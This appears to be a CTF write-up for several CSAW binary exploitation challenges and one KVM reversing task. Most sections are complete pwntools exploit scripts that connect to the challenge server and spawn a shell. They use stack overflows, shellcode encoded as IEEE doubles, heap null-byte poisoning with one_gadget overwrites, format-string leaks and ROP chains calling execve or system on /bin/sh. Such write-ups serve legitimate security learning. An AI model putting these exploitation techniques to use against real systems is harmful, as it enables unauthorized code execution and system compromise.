## boi

stack overflow to change the variable

## getit

stack overflow to change the return address to the shell function

## shell code

put `/bin/sh\x00` into node 1, and put shellcode 

```assembly
add esp,0x30
xor rdx,rdx
xor rsi,rsi
push SYS_execve
pop rax
syscall
```

to node 2 and initials

bacause the memory layout, is initials, node 2, node 1, from low address to high address

## doubletrouble

The problem is the total length will increase in `find_array`

```c
int __cdecl findArray(int *a1, double *a2, double a3, double a4)
{
  int v5; // [esp+1Ch] [ebp-4h]

  v5 = *a1;
  while ( *a1 < 2 * v5 )
  {
    if ( a2[*a1 - v5] > (long double)a3 && a4 > (long double)a2[*a1 - v5] )
      return *a1 - v5;
    ++*a1;
  }
  *a1 = v5;
  return 0;
}
```

Then it will sort according to the increased size, which can affect return address.

However, there is canary, so we need to let the canary stay at the same position after sorting, with return address being changed.

What I've chosen is to set it as `leave ret`, and pivot the stack into our double array, then execute `retn` to execute our shellcode in the form of IEEE double. Also, the shellcode must be sorted, which can be implemented by manipulating the exponential part of IEEE double, while the digits are our shellcode with `jmp short`.

This takes me a lot of time, and we need to execute `/bin/sh` instead of `/bin/csh` as it suggested in the strings in the executable. Also, since canary is random, we cannot be sure about the position of canary after sorting, so my approach gives about `1/40` probability.

//todo, more detailed illustration later

```python
from pwn import *
import struct
g_local=False
context.log_level='debug'


LEAVE_RET = 0x08049166
DOUBLE_OFF = 0
def to_double(num):
	return struct.unpack('<d', p64(num))[0]

def make_ieee_double(exp, digit, sign = 1):
	assert sign == 1 or sign == 0
	assert digit >= 0 and digit < (1 << 52)
	rexp = exp + 1023
	assert rexp >= 0 or rexp < 2048
	return to_double((sign << 63) + (rexp << 52) + digit)

def shellcodes_4(asmcode):
	ret = asm(asmcode)
	assert len(ret) <= 4
	return u64(ret.ljust(4, "\x90") + '\xeb\x02\x00\x00')

def make_shellcode(shpath):
	assert len(shpath) % 4 == 0
	ret = []
	e = 1000
	#0x804A127
	for x in range(0, len(shpath), 4)[::-1]:
		ret.append(make_ieee_double(e, shellcodes_4("mov ax," + hex(u16(shpath[x+2:x+4])))))
		e -= 1
		ret.append(make_ieee_double(e, shellcodes_4("shl eax,16")))
		e -= 1
		ret.append(make_ieee_double(e, shellcodes_4("mov ax," + hex(u16(shpath[x:x+2])))))
		e -= 1
		ret.append(make_ieee_double(e, shellcodes_4("push eax")))
		e -= 1
	#0x804BFF0
	ret.append(make_ieee_double(e, shellcodes_4("push esp")))
	e -= 1
	ret.append(make_ieee_double(e, shellcodes_4("mov ax,0x804")))
	e -= 1
	ret.append(make_ieee_double(e, shellcodes_4("shl eax,16")))
	e -= 1
	ret.append(make_ieee_double(e, shellcodes_4("mov ax,0xBFF0")))
	e -= 1
	ret.append(make_ieee_double(e, shellcodes_4("mov eax,[eax]")))
	e -= 1
	ret.append(make_ieee_double(e, shellcodes_4("call eax")))
	return ret

def exploit():
	if g_local:
		sh = process('./doubletrouble')#env={'LD_PRELOAD':'./libc.so.6'}
		shstr = "/bin/sh\x00"
		gdb.attach(sh)
	else:
		sh = remote("pwn.chal.csaw.io", 9002)
		shstr = "/bin/sh\x00"
	sh.recvuntil("0x")
	leak = int(sh.recv(8),16)
	arr = leak + DOUBLE_OFF
	smallest = make_ieee_double(1020, arr + 0x20)
	bigger = make_ieee_double(800, 0xdeadbeef)

	payload = [smallest] * 4 + [-50.0] + [to_double((LEAVE_RET << 32) + arr - 4)] * 2 + make_shellcode(shstr)
	payload += [bigger] * (64-len(payload))
	assert len(payload) == 64
	sh.recvuntil("How long: ")
	sh.send(str(len(payload)) + "\n")
	for n in payload:
		sh.recvuntil("Give me: ")
		sh.send(repr(n) + "\n")
	sh.recvuntil("Sorted Array:")
	ret = sh.recvuntil("terminated\r\n", timeout = 3.0)
	if ret == '':
		sh.interactive()
	else:
		return sh

while True:
	try:
		exploit().close()
	except Exception as e:
		print "failed"
```



## alien

The sumurai part seems to be unexploitable, but there is a null byte off-by-one when we call `new_alien`

```c
v0->name[(signed int)read(0, v0->name, size)] = 0; // off by one
v1 = alien_index++;
```

so we can use null byte poisoning to do it, however, we cannot write `__malloc_hook` or `__free_hook`, but there is a pointer in the alien structure, and we can show and edit it. Thus, we can use it to leak the stack address using `environ` in libc, and then write the return address of `hatchery` to `one_gadget` with the zero precondition.

The other parts seems to be not useful, although there are many problems in this binary. However, these problems are unexploitable or hard to exploit.

exp

```python
from pwn import *

g_local=True
context.log_level='debug'

if g_local:
	e = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	sh = process('./aliensVSsamurais')#env={'LD_PRELOAD':'./libc.so.6'}
	ONE_GADGET_OFF = 0x4526a
	UNSORTED_OFF = 0x3c4b78
	gdb.attach(sh)
else:
	ONE_GADGET_OFF = 0x4526a
	UNSORTED_OFF = 0x3c4b78
	sh = remote("pwn.chal.csaw.io", 9004)
	e = ELF("./libc.so.6")
	#ONE_GADGET_OFF = 0x4557a

def create(length, content):
	sh.send("1\n")
	sh.recvuntil("How long is my name?\n")
	sh.send(str(length) + "\n")
	sh.recvuntil("What is my name?\n")
	sh.send(content)
	sh.recvuntil("Brood mother, what tasks do we have today.\n")

def delete(idx):
	sh.send("2\n")
	sh.recvuntil("Which alien is unsatisfactory, brood mother?\n")
	sh.send(str(idx) + "\n")
	sh.recvuntil("Brood mother, what tasks do we have today.\n")

def editidx(idx, content = None):
	sh.send("3\n")
	sh.recvuntil("Brood mother, which one of my babies would you like to rename?\n")
	sh.send(str(idx) + "\n")
	sh.recvuntil("Oh great what would you like to rename ")
	ret = sh.recvuntil(" to?\n")
	ret = ret[:len(ret)-len(" to?\n")]
	if content:
		sh.send(content)
	else:
		sh.send(ret)
	sh.recvuntil("Brood mother, what tasks do we have today.\n")
	return ret

sh.recvuntil("Daimyo, nani o shitaidesu ka?\n")
sh.send("1\n")
sh.recvuntil("What is my weapon's name?\n")
sh.send("1\n")
sh.recvuntil("Daimyo, nani o shitaidesu ka?\n")
sh.send("3\n")
#use samurai to put malloc hook to 0

sh.recvuntil("Brood mother, what tasks do we have today.\n")
create(0x10, "fastbin") #0
create(0x10, "fastbin") #1
delete(0)
delete(1)
#prepare some 0x20 fastbin

create(0x210, "a") #2
create(0x100, "c") #3
create(0x100, "padding") #4

delete(2)
create(0x108, "a" * 0x108) #5
#0x111 -> 0x100
#0x20 fastbin *1

create(0x80, "b1") #6
create(0x100 - 0x90 - 0x20 - 0x10, "b2b2b2b2b2b2b2b2") #7

delete(6)
delete(3)
#0x221 unsorted bin
#0x20 *2

create(0xa0, "consume unsorted + leak") # 8
libc_addr = u64(editidx(7) + "\x00\x00") - UNSORTED_OFF
print hex(libc_addr)
delete(8)
#recover to 0x221 unsorted bin
#0x20 *2

create(0xa0, "A" * 0x88 + p64(0x21) + p64(libc_addr + e.symbols["environ"]) + p64(0xdeadbeef)) # 9
stack_addr = u64(editidx(7) + "\x00\x00")
print hex(stack_addr)
delete(9)
#leak = 0xe58

#0xd48 -> one_gadget 0x30
create(0xa0, "A" * 0x88 + p64(0x21) + p64(stack_addr - 0xe58 + 0xd48) + p64(0xdeadbeef)) # 10
editidx(7, p64(libc_addr + ONE_GADGET_OFF))
delete(10)


#0xd80 -> 0
create(0xa0, "A" * 0x88 + p64(0x21) + p64(stack_addr - 0xe58 + 0xd80) + p64(0xdeadbeef)) # 11
editidx(7, p64(0))
delete(11)

sh.interactive()
```

## plc

1. use `x` command to dump the binary, so that we can cheat using IDA.
2. after some reversing, we found that there is overflow and no null termination when we fill `enrichment` string
3. There is a function pointer just after it, which should point to `sub_AB0`, we can leak pie first
4. then after some debugging, we know that when we call that function pointer, the `rdi` points to `enrichment`
5. change that function to `printf`, so we can leak the `libc` address
6. then change it to a ROP gadget, which can let the program go to our ROP chain, 
7. because there is a 128-length buffer that we can control in stack
8. use return to syscall using gadgets in libc, since the original `execve` is disabled

```python
import interact
sh = interact.Process()

def u16(st):
	assert len(st) == 2
	return ord(st[0]) + (ord(st[1]) << 8)

def p16(num):
	return chr(num & 0xff) + chr((num >> 8) & 0xff)

def u64(st):
	return u16(st[0:2]) + (u16(st[2:4]) << 0x10) + (u16(st[4:6]) << 0x20) + (u16(st[6:8]) << 0x30)

def p64(num):
	return p16(num & 0xffff) + p16((num >> 0x10) & 0xffff) + p16((num >> 0x20) & 0xffff) + p16((num >> 0x30) & 0xffff)

def checksum(codes):
	codes_len = 1020
	assert len(codes) == codes_len
	acc = 0
	k = 2
	for i in xrange(0, codes_len, 2):
		acc = u16(codes[i:i+2]) ^ ((k + (((acc << 12) & 0xffff) | (acc >> 4))) & 0xffff)
		k += 1
	return acc

def make_fw(codes):
	codes = "19" + codes
	cs = checksum(codes)
	ret = "FW" + p16(cs) + codes
	assert len(ret) == 0x400
	return ret

def update(codes):
	sh.send("U\n")
	sh.send(make_fw(codes.ljust(1018,"\x00")))

def execute(payload = '', leak = False):
	sh.send("E".ljust(8,'\x00') + payload + "\n") #at 11$
	if leak:
		sh.readuntil("2019")
		return sh.readuntil("\x7f")

def status():
	sh.send("S\n")
	print sh.readuntil("ENRICHMENT MATERIAL: " + 'A' * 68)
	ret = sh.readuntil("\n")
	ret = ret[:len(ret)-1]
	return ret

def make_payload(st):
	ret = ""
	for c in st:
		ret += '2'
		ret += c
	return ret

def make_format(fmt):
	return make_payload("2019" + fmt + "A" * (64-len(fmt)) + p64(prog_addr + 0x900)) #printf

print sh.readuntil("- - - - - - - - - - - - - - - - - - - - \n")
print sh.readuntil("- - - - - - - - - - - - - - - - - - - - \n")
#update("7" * 70 + "31" + "21" * 0x100 + "9")
update("2A" * 68 + "9")
execute()

prog_addr = (u64(status() + "\x00\x00") - 0xAB0)
print hex(prog_addr)
trigger = "7" * 70 + "31" + "9"
update(make_format("%11$s") + trigger)
leak = execute(p64(prog_addr + 0x202018), True) #puts

libc_addr = u64(leak + "\x00\x00") - 0x6f690
print hex(libc_addr)

rop_start = libc_addr + 0x10a407 # add rsp, 0x40 ; ret
pop_rax_ret = libc_addr + 0x33544
pop_rdi_ret = libc_addr + 0x21102
pop_rsi_ret = libc_addr + 0x202e8
pop_rdx_ret = libc_addr + 0x1b92

rop = p64(pop_rax_ret) + '\x3b'.ljust(8, '\x00')# bug? p64(59) #execve 
rop += p64(pop_rdi_ret) + p64(libc_addr + 0x18CD57) #/bin/sh
rop += p64(pop_rsi_ret) + p64(0)
rop += p64(pop_rdx_ret) + p64(0)
rop += p64(libc_addr + 0xF725E) #syscall

update(make_payload("2019" + "A" * 64 + p64(rop_start)) + trigger)
execute('A' * 0x10 + rop)

sh.interactive()
```

## turtles

After reversing function `objc_msg_lookup`, we found that if we satisfy some conditions, we can manipulate the return value, which will be called, and then we can do ROP, because we can control the buffer on stack. What I did is to switch the stack to heap to do further exploitation.

Firstly, leak the `libc` address and return to main function, then do the same thing again to execute `system("/bin/sh")`

exp

```python
from pwn import *

g_local=False
context.log_level='debug'

e = ELF("./libc-2.19.so")
p = ELF("./turtles")
if g_local:
	sh = remote("192.168.106.151", 9999)#env={'LD_PRELOAD':'./libc.so.6'}
else:
	sh = remote("pwn.chal.csaw.io", 9003)
	#ONE_GADGET_OFF = 0x4557a

LEAVE_RET = 0x400b82
POP_RDI_RET = 0x400d43
#rop = 'A' * 0x80
rop = p64(POP_RDI_RET)
rop += p64(p.got["printf"])
rop += p64(p.plt["printf"])
rop += p64(0x400B84) #main

sh.recvuntil("Here is a Turtle: 0x")
leak = sh.recvuntil("\n")
obj_addr = int(leak, 16)

rop_pivot = p64(0x400ac0) #pop rbp ret
rop_pivot += p64(obj_addr + 8 + 0x20 + 0x10 + 0x30)
rop_pivot += p64(LEAVE_RET) + p64(0)

fake_turtle = p64(obj_addr + 8 + 0x20 - 0x40)
fake_turtle += rop_pivot
# different when dynamic
# fake_turtle += p64(0x601400) + p64(0x601328)
# fake_turtle += p64(0x601321) + p64(0)
# fake_turtle += p64(1) + p64(8)
# fake_turtle += p64(0) + p64(obj_addr + 8 + 0x20 + 0x80)
# fake_turtle += 8 * p64(0)
# #------------------
# fake_turtle += p64(0) + p64(1)
# fake_turtle += p64(0x601331) + p64(0x601349)
# fake_turtle += p64(0x400d3c) #pop 5 ret
# fake_turtle += 3 * p64(0)

fake_turtle += p64(obj_addr + 8 + 0x20 + 0x10) + p64(0)
#----------------
fake_turtle += p64(0) + p64(obj_addr + 8 + 0x20 + 0x10 + 0x10) #pop 5 ret
fake_turtle += p64(0x400d3c) + p64(0) * 3 #pop 5 ret
fake_turtle += 'a' * 8 + rop
sh.interactive()
sh.send(fake_turtle)
libc_addr = u64(sh.recvuntil("\x7f") + "\x00\x00") - e.symbols["printf"]
print hex(libc_addr)

sh.recvuntil("Here is a Turtle: 0x")
leak = sh.recvuntil("\n")
obj_addr = int(leak, 16)

rop_pivot = p64(0x400ac0) #pop rbp ret
rop_pivot += p64(obj_addr + 8 + 0x20 + 0x10 + 0x30)
rop_pivot += p64(LEAVE_RET) + p64(0)

fake_turtle = p64(obj_addr + 8 + 0x20 - 0x40)
fake_turtle += rop_pivot
fake_turtle += p64(obj_addr + 8 + 0x20 + 0x10) + p64(0)
#----------------
fake_turtle += p64(0) + p64(obj_addr + 8 + 0x20 + 0x10 + 0x10) #pop 5 ret
fake_turtle += p64(0x400d3c) + p64(0) * 3 #pop 5 ret
fake_turtle += 'a' * 8 + p64(POP_RDI_RET) + p64(libc_addr + next(e.search('/bin/sh\x00')))
fake_turtle += p64(libc_addr + e.symbols["system"]) #0x30 one_gadget

sh.send(fake_turtle)

sh.interactive()
```

//todo

## kvm

The OS is obsfucated by using `hlt` instruction to implement the conditional or unconditional `jmp`, so we can patch it first

```python
hlt_tab = {0xc50b6060 : 0x454,
0x9d1fe433 : 0x3ed,
0x54a15b03 : 0x376,
0x8f6e2804 : 0x422,
0x8aeef509 : 0x389,
0x3493310d : 0x32c,
0x59c33d0f : 0x3e1,
0x968630d0 : 0x400,
0xef5bdd13 : 0x435,
0x64d8a529 : 0x3b8,
0x5f291a64 : 0x441,
0x5de72dd : 0x347,
0xfc2ff49f : 0x3ce}
text_end = 0x611
def replace_jmps(start,end):
	for p in xrange(start,end):
		if Byte(p) == 0xB8 and Byte(p + 5) == 0xF4 and Dword(p + 1) in hlt_tab:
			jmp_addr = hlt_tab[Dword(p + 1)]
			PatchByte(p, 0xE9)
			PatchDword(p + 1, (jmp_addr - (p + 5)) & 0xffffffff)
			PatchByte(p + 5, 0x90)
		#Patch to hlt to jmp
```

There are only 4 conditional `jmp`, so analyze them by hand. Also, edit the function to extend it, so that the analysis in IDA will be easier.

After some reversing, we found that the program is a Radix Tree. It will encode the input into the path going from root node to the corresponding leaf node, but in reversed order(which makes decoding very hard, since the ambiguity exists).

I got stucked in the algorithm for 3 hours, will add more details later if I have time.

```python
ROOT_OFF = 0x1300
def MyQword(addr):
	ret = Qword(addr)
	if ret == 0xFFFFFFFFFFFFFFFF:
		return 0
	else:
		return ret
def MyByte(addr):
	ret = Byte(addr)
	if ret == 0xFF:
		return 0
	else:
		return ret

#dfs to get the mapping
def get_path_to_char(node):
	if MyQword(node) != 0xFF:
		return [([],chr(MyQword(node)))]
	right = MyQword(node + 0x10)
	left = MyQword(node + 8)
	ret = []
	lmap = get_path_to_char(left)
	for (p, c) in lmap:
		ret.append((p + [0], c))
	rmap = get_path_to_char(right)
	for (p, c) in rmap:
		ret.append((p + [1], c))
	return ret

def begin_with(l, sl):
	if len(sl) > len(l):
		return False
	for i in xrange(0, len(sl)):
		if l[i] != sl[i]:
			return False
	return True
# recursion too long!!!
# #return lsit of strings of possibilities
# def get_all_poss(bits, mapping, pad):
# 	poss = []
# 	for (p,c) in mapping:
# 		if begin_with(bits, p):
# 			poss.append((len(p), c))
# 	ret = []
# 	for x in poss:
# 		#print poss
# 		print pad * ' ' + x[1]
# 		ret += map(lambda st : x[1] + st, get_all_poss(bits[x[0]:], mapping, pad + 1))
# 	#print ret
# 	return ret

#return lsit of strings of possibilities
def get_all_poss(obits, mapping, pad):
	live_bits = [("",obits)]
	while len(live_bits) != 1 or len(live_bits[0][1]) != 0:
		(parsed,bits) = live_bits.pop()
		poss = []
		for (p,c) in mapping:
			if begin_with(bits, p):
				poss.append((len(p), c))
		#get all poss
		for x in poss:
			#print x
			live_bits.append((parsed + x[1],bits[x[0]:]))
		#if len(live_bits) == 1:
		print live_bits
	return live_bits

def recover(data):
	ret = []
	bits = []
	for x in data:
		for i in range(0,8):
			if x & (1 << i) != 0:
				bits.append(1)
			else:
				bits.append(0)
	print bits
	mapping = get_path_to_char(ROOT_OFF)
	#while len(bits) > 0: loop does not work well for ambiguoutyt
	ret = get_all_poss(bits, mapping, 0)
	return ret

# fails because it is in reverse order
# def recover(data):
# 	ret = []
# 	cur_node = ROOT_OFF
# 	for x in data:
# 		for i in range(0,8)[::-1]:
# 			print hex(cur_node)
# 			if x & (1 << i) != 0: #r
# 				cur_node = MyQword(cur_node + 0x10)
# 			else:
# 				cur_node = MyQword(cur_node + 8)
# 			if MyQword(cur_node) != 0xff:
# 				ret.append(MyQword(cur_node))
# 				cur_node = ROOT_OFF
# 	return ret
```

Even in the end I did not get the original input, but I've already got the flag, which is part of the input.